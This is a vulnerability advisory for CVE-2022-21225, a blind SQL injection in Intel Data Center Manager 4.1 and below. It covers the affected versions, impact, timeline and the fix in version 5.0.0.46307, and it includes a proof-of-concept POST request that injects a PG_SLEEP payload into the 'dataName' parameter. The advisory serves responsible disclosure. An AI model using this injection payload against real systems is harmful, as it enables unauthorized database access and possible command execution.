@@ -1,0 +1,100 @@
+id: 38099
+date: 12/10/2022
+title: Intel Data Center Manager 4.1 SQL Injection Vulnerability
+author: Julien Ahrens
+cves: CVE-2022-21225
+
+1. ADVISORY INFORMATION
+=======================
+Product:        Intel Data Center Manager
+Vendor URL:     https://www.intel.com/content/www/us/en/developer/tools/data-center-manager-console/overview.html
+Type:           SQL Injection [CWE-89]
+Date found:     2022-01-21
+Date published: 2022-12-01
+CVSSv3 Score:   9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
+CVE:            CVE-2022-21225
+
+
+2. CREDITS
+==========
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+
+
+3. VERSIONS AFFECTED
+====================
+Intel Data Center Manager 4.1 and below
+
+
+4. INTRODUCTION
+===============
+Energy costs are the fastest rising expense for today’s data centers. Intel® Data
+Center Manager (Intel® DCM) provides real-time power and thermal consumption data,
+giving you the clarity you need to lower power usage, increase rack density, and
+prolong operation during outages.
+
+(from the vendor's homepage)
+
+
+5. VULNERABILITY DETAILS
+========================
+Intel DCM's endpoint at "/DcmConsole/DataAccessServlet?action=getRoomRackData" is
+vulnerable to an authenticated, blind SQL Injection when user-supplied input to
+the HTTP POST parameter "dataName" is processed by the web application.
+
+Since the application does not properly validate and sanitize this parameter, an
+attacker can inject arbitrary SQL commands against the PostgreSQL backend
+database server of the web application.
+
+Successful exploits can allow an authenticated attacker (the lowest possible
+authorization level "Guest" is sufficient) to read and modify database contents
+and execute any system commands on the underlying operating system. This way,
+the attacker can compromise the system's entire confidentiality, integrity, and
+availability.
+
+
+6. PROOF OF CONCEPT
+===================
+POST /DcmConsole/DataAccessServlet?action=getRoomRackData HTTP/1.1
+Host: [ip-address]
+Cookie: JSESSIONID=[session-id]
+Content-Length: 153
+Accept: application/json, text/plain, */*
+Content-Type: text/plain
+User-Agent: Mozilla/5.0
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+{"antiCSRFId":"[your-anti-csrf-id]","requestObj":{"snapshotId":1,"roomId":1,"dataName":"test');SELECT PG_SLEEP(5)--"}}
+
+(see the referenced blog post for more details)
+
+
+7. SOLUTION
+===========
+Update at least to version 5.0.0.46307.
+
+
+8. REPORT TIMELINE
+==================
+2022-01-21: Discovery of the vulnerability
+2022-01-21: Reported to vendor via their bug bounty program
+2022-01-21: Vendor response: Sent to "appropriate reviewers"
+2022-02-08: Vendor acknowledges the vulnerability with a severity of "medium" without sharing their CVSS calculation
+2022-02-15: Endless back-and-forth discussions about the rating. Vendor proposes a rating of 6.8
+2022-02-16: I don't accept the rating because the vendor downplayed it
+2022-02-25: After discussions, vendor rates issue as CVSS 9.0 (CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
+2022-02-25: Apparently AV:A is still wrong, but I don't have more energy to fight them. However this advisory contains the proper CVSS rating.
+2022-xx-xx: Vendor releases version 5.0.0.46307 which includes the fix
+2022-08-09: Vendor releases advisory INTEL-SA-00662
+2022-12-01: Public disclosure
+
+
+9. REFERENCES
+==============
+https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/
+https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00662.html
+https://github.com/MrTuxracer/advisories
+
+#  0day.today [2023-03-27]  #
